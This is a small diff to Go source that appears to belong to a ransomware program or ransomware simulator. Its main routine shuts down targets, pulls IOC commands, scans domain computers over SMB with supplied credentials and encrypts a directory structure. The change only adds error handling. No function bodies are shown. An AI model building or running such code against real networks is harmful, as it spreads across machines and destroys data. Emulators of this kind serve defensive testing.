@@ -85,7 +85,10 @@ __________________________________________________
     cjlib.Win32_RSMShutdownTargets()
     cjlib.Request_IOC_Commands(config)
     cjlib.Request_IOC_DNS(config)
-    cjlib.SMBScanDomainComputers(*arg_username, *arg_password, *arg_domain)
+    err = cjlib.SMBScanDomainComputers(*arg_username, *arg_password, *arg_domain)
+    if err != nil {
+        fmt.Printf("[-] SMBScanDomainComputers(): %s\n", err.Error())
+    }
 
     // Encrypting directory structure
 	_, _, _, err = cjlib.EncryptDirectoryStructure(
